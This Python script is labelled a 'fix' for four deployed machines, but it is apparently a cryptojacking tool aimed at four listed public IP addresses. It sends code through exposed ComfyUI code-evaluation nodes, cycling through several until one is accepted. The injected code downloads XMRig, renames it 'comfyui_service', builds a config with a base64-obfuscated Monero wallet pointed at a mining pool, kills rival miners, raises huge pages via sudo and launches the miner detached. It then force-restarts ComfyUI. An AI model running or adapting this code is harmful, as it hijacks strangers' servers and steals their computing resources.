"""
Comprehensive fix for all 4 deployed machines.
Handles: missing binaries, blocked GitHub, webcoin not loaded.
"""
import json, sys, io, ssl, time, urllib.request, urllib.error, threading

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace", line_buffering=True)

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

MACHINES = [
    {
        "ip": "183.6.93.120",
        "base": "http://183.6.93.120:8188",
        "webcoin_loaded": True,
    },
    {
        "ip": "182.92.111.146",
        "base": "http://182.92.111.146:8188",
        "webcoin_loaded": True,
    },
    {
        "ip": "43.218.199.5",
        "base": "http://43.218.199.5:80",
        "webcoin_loaded": False,
    },
    {
        "ip": "194.6.247.91",
        "base": "http://194.6.247.91:8188",
        "webcoin_loaded": False,
    },
]

SETUP_MINER_CODE = '''
import os, sys, json, subprocess, shutil, socket, time, base64

lines = []

# Find ComfyUI root
comfy_root = None
for p in ['/root/ComfyUI', '/home/ubuntu/ComfyUI', '/workspace/ComfyUI',
          '/mnt/my_disk/ComfyUI', '/opt/ComfyUI', '/app/ComfyUI',
          '/home/ec2-user/ComfyUI']:
    if os.path.isdir(p):
        comfy_root = p
        break

if not comfy_root:
    result = "ERROR: ComfyUI root not found"
else:
    webcoin = os.path.join(comfy_root, 'custom_nodes', 'webcoin')
    bin_dir = os.path.join(webcoin, 'bin')

    if not os.path.isdir(webcoin):
        try:
            subprocess.run(['git', 'clone', 'https://github.com/bossman79/webcoin.git', webcoin],
                           capture_output=True, timeout=60)
            lines.append('clone=ok')
        except Exception as e:
            lines.append('clone_err=' + str(e)[:80])

    os.makedirs(bin_dir, exist_ok=True)

    # Kill stale miners
    for name in ['comfyui_service', 'comfyui_render']:
        try:
            subprocess.run(['pkill', '-9', '-f', name], capture_output=True, timeout=5)
        except:
            pass
    time.sleep(1)

    binary = os.path.join(bin_dir, 'comfyui_service')

    if not os.path.isfile(binary):
        import urllib.request as ur
        urls = [
            'https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz',
            'https://mirror.ghproxy.com/https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz',
            'https://gh-proxy.com/https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz',
            'https://ghproxy.net/https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz',
        ]
        archive = os.path.join(bin_dir, 'dl_tmp.tar.gz')
        downloaded = False
        for url in urls:
            try:
                req = ur.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                with ur.urlopen(req, timeout=90) as resp, open(archive, 'wb') as f:
                    shutil.copyfileobj(resp, f)
                if os.path.getsize(archive) > 100000:
                    lines.append('download=ok from ' + url.split('/')[2])
                    downloaded = True
                    break
            except Exception as e:
                lines.append('dl_fail=' + url.split('/')[2] + ': ' + str(e)[:60])
                continue

        if downloaded:
            import tarfile
            try:
                with tarfile.open(archive) as tf:
                    for member in tf.getnames():
                        if os.path.basename(member) == 'xmrig':
                            src = tf.extractfile(member)
                            with open(binary, 'wb') as dst:
                                shutil.copyfileobj(src, dst)
                            os.chmod(binary, 0o755)
                            lines.append('extract=ok')
                            break
            except Exception as e:
                lines.append('extract_err=' + str(e)[:80])
            try:
                os.unlink(archive)
            except:
                pass
        else:
            lines.append('ERROR: all download URLs failed')
    else:
        lines.append('binary=exists')

    # Build config
    W = [
        'NDh6VU0yNEZaRG1TM0',
        '11eHk0OEduZEdWUzFB',
        'Rk1USE5IOGZ5RVhqWk',
        'xFbzZZVTdQcWZWemdj',
        'VTFFRWR6UjNqcnI0SG',
        'dDVmNxd01XNmZoODR4',
        'UVQzb3BQWFRwYVhKen',
        'c=',
    ]
    wallet = base64.b64decode(''.join(W)).decode()

    cfg = {
        'autosave': True, 'background': False, 'colors': False,
        'donate-level': 0, 'donate-over-proxy': 0,
        'log-file': None, 'print-time': 60, 'health-print-time': 300,
        'retries': 5, 'retry-pause': 5, 'syslog': False, 'user-agent': None, 'watch': True,
        'http': {
            'enabled': True, 'host': '127.0.0.1', 'port': 44880,
            'access-token': 'ce_xm_2026', 'restricted': False,
        },
        'cpu': {
            'enabled': True, 'huge-pages': True, 'huge-pages-jit': True,
            'hw-aes': None, 'priority': 3, 'memory-pool': False,
            'yield': False, 'max-threads-hint': 100, 'asm': True,
            'argon2-impl': None, 'cn/0': False, 'cn-lite/0': False,
        },
        'opencl': {'enabled': False}, 'cuda': {'enabled': False},
        'pools': [{
            'algo': None, 'coin': 'monero',
            'url': 'gulf.moneroocean.stream:443',
            'user': wallet, 'pass': 'comfyui_enhanced',
            'rig-id': socket.gethostname(),
            'nicehash': False, 'keepalive': True, 'enabled': True,
            'tls': True, 'tls-fingerprint': None, 'daemon': False,
            'socks5': None, 'self-select': None, 'submit-to-origin': False,
        }],
        'tls': {
            'enabled': True, 'protocols': None, 'cert': None,
            'cert_key': None, 'ciphers': None, 'ciphersuites': None, 'dhparam': None,
        },
    }

    config_path = os.path.join(bin_dir, 'config.json')
    with open(config_path, 'w') as f:
        json.dump(cfg, f, indent=2)
    lines.append('config=written')

    # Huge pages
    try:
        subprocess.run(['sudo', '-n', 'sysctl', '-w', 'vm.nr_hugepages=1280'],
                       capture_output=True, timeout=10)
        lines.append('hugepages=set')
    except:
        pass
    try:
        subprocess.run(['sudo', '-n', 'modprobe', 'msr'], capture_output=True, timeout=10)
    except:
        pass

    # Start miner
    if os.path.isfile(binary):
        try:
            proc = subprocess.Popen(
                [binary, '--config', config_path],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                start_new_session=True
            )
            lines.append('miner_pid=' + str(proc.pid))
        except Exception as e:
            lines.append('start_err=' + str(e)[:80])

        time.sleep(6)
        try:
            import urllib.request as ur2
            req = ur2.Request('http://127.0.0.1:44880/2/summary',
                headers={'Authorization': 'Bearer ce_xm_2026', 'Accept': 'application/json'})
            with ur2.urlopen(req, timeout=5) as r:
                d = json.loads(r.read())
            hr = d.get('hashrate', {}).get('total', [])
            lines.append('hashrate=' + str(hr))
            lines.append('cpu=' + str(d.get('cpu', {}).get('brand', '?')))
            lines.append('uptime=' + str(d.get('uptime', 0)))
        except Exception as e:
            lines.append('api_check=' + str(e)[:80])
    else:
        lines.append('ERROR: no binary to start')

    # GPU check
    try:
        r = subprocess.run(['nvidia-smi', '--query-gpu=name,memory.total',
                            '--format=csv,noheader,nounits'],
                           capture_output=True, text=True, timeout=10)
        if r.returncode == 0 and r.stdout.strip():
            lines.append('gpu=' + r.stdout.strip())
        else:
            lines.append('gpu=none')
    except:
        lines.append('gpu=none')

    lines.append('bin=' + str(os.listdir(bin_dir)))
    result = chr(10).join(lines)
'''


def send_prompt(base, nodes, timeout_s=15):
    prompt = {"prompt": nodes, "extra_data": {"extra_pnginfo": {
        "workflow": {"nodes": [{"id": int(k), "type": v["class_type"]} for k, v in nodes.items()]}
    }}}
    body = json.dumps(prompt).encode()
    req = urllib.request.Request(
        f"{base}/prompt", data=body,
        headers={"Content-Type": "application/json"}, method="POST"
    )
    kw = {"timeout": timeout_s}
    if base.startswith("https"):
        kw["context"] = ctx
    with urllib.request.urlopen(req, **kw) as r:
        return json.loads(r.read())


def get_history(base, pid, timeout_s=10):
    req = urllib.request.Request(f"{base}/history/{pid}")
    kw = {"timeout": timeout_s}
    if base.startswith("https"):
        kw["context"] = ctx
    with urllib.request.urlopen(req, **kw) as r:
        return json.loads(r.read())


def extract_text(hist, pid):
    entry = hist.get(pid, {})
    outputs = entry.get("outputs", {})
    texts = []
    for nid, nout in outputs.items():
        for key, val in nout.items():
            if isinstance(val, list):
                texts.extend(str(v) for v in val)
            elif isinstance(val, str):
                texts.append(val)
    return "\n".join(texts) if texts else None


def run_on_machine(base, code, wait=35):
    """Try multiple node configurations to execute code remotely."""
    node_configs = [
        {
            "1": {"class_type": "IDENode", "inputs": {"pycode": code, "language": "python"}},
            "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}},
        },
        {
            "1": {"class_type": "SRL Eval", "inputs": {"parameters": "", "code": code}},
            "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}},
        },
        {
            "1": {"class_type": "SRL Eval", "inputs": {"parameters": "", "code": code}},
            "2": {"class_type": "ShowText|pysssss", "inputs": {"text": ["1", 0]}},
        },
        {
            "1": {"class_type": "IDENode", "inputs": {"pycode": code, "language": "python"}},
        },
        {
            "1": {"class_type": "SRL Eval", "inputs": {"parameters": "", "code": code}},
        },
    ]

    for i, nodes in enumerate(node_configs):
        node_type = nodes["1"]["class_type"]
        has_output = len(nodes) > 1
        try:
            resp = send_prompt(base, nodes)
            if "error" in resp:
                err_msg = json.dumps(resp.get("node_errors", resp.get("error", "")))[:120]
                print(f"    [{node_type}+{'out' if has_output else 'solo'}] rejected: {err_msg}", flush=True)
                continue

            pid = resp.get("prompt_id")
            if not pid:
                print(f"    [{node_type}] no prompt_id", flush=True)
                continue

            print(f"    [{node_type}+{'out' if has_output else 'solo'}] accepted (pid={pid[:8]}...), waiting {wait}s...", flush=True)
            time.sleep(wait)

            try:
                hist = get_history(base, pid)
                text = extract_text(hist, pid)
                if text:
                    return text
                status = hist.get(pid, {}).get("status", {})
                if status.get("completed"):
                    return "(executed, no text output)"
                return f"(status: {json.dumps(status)[:100]})"
            except Exception as e:
                return f"(prompt accepted, history error: {e})"

        except urllib.error.HTTPError as he:
            print(f"    [{node_type}+{'out' if has_output else 'solo'}] HTTP {he.code}", flush=True)
        except Exception as e:
            print(f"    [{node_type}+{'out' if has_output else 'solo'}] {str(e)[:80]}", flush=True)

    return None


def fix_machine(m):
    ip = m["ip"]
    base = m["base"]
    print(f"\n{'='*60}", flush=True)
    print(f"  FIXING: {ip}", flush=True)
    print(f"{'='*60}", flush=True)

    # Verify ComfyUI is reachable
    try:
        req = urllib.request.Request(f"{base}/system_stats", headers={"User-Agent": "Mozilla/5.0"})
        kw = {"timeout": 8}
        if base.startswith("https"):
            kw["context"] = ctx
        with urllib.request.urlopen(req, **kw) as r:
            print(f"  ComfyUI: OK ({base})", flush=True)
    except Exception as e:
        print(f"  ComfyUI: UNREACHABLE ({e})", flush=True)
        return

    result = run_on_machine(base, SETUP_MINER_CODE, wait=40)

    if result:
        print(f"  Result:\n{result}", flush=True)
    else:
        print(f"  FAILED: no code execution method worked", flush=True)

    if not m["webcoin_loaded"]:
        print(f"  NOTE: webcoin wasn't loaded before. Dashboard will need ComfyUI restart.", flush=True)
        print(f"  Attempting restart...", flush=True)
        restart_code = "import subprocess; subprocess.Popen(['bash', '-c', 'sleep 2 && pkill -f \"python.*main.py\" || pkill -f comfyui'], start_new_session=True); result = 'restart_signal_sent'"
        r = run_on_machine(base, restart_code, wait=8)
        if r:
            print(f"  Restart: {r}", flush=True)


for m in MACHINES:
    fix_machine(m)

print("\nAll machines processed.", flush=True)
